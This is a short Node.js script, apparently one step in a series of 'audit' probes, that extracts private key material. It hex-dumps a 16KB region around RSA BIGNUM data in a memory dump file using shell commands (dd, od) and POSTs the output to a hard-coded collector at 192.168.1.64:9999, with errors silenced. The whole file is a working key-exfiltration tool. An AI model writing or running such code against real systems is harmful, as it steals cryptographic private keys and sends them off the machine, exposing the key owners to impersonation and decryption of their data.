"use strict";
// audit104.js - dump 16KB around the RSA BIGNUM data for PC-side private key extraction.
// Key data found at acr_mem2.bin offset ~9530620-9535600. Dump the full region
// and POST as hex (chunked).
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 30000 }).slice(0, cap || 80000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();

// dump 16KB around the RSA key area as hex
out.rsa_region_hex = sh("dd if=/tmp/acr_mem2.bin bs=1 skip=9530000 count=16384 2>/dev/null | od -A x -t x1 | head -1200", 70000);

// also dump the BIGNUM struct candidates (look for small ints like top/dmax near pointers)
out.bignum_structs = sh("dd if=/tmp/acr_mem2.bin bs=1 skip=9530600 count=8192 2>/dev/null | od -A x -t x1z | head -600", 40000);

post("/p104_rsa_dump", out);
post("/p104_done", { started: out.started });
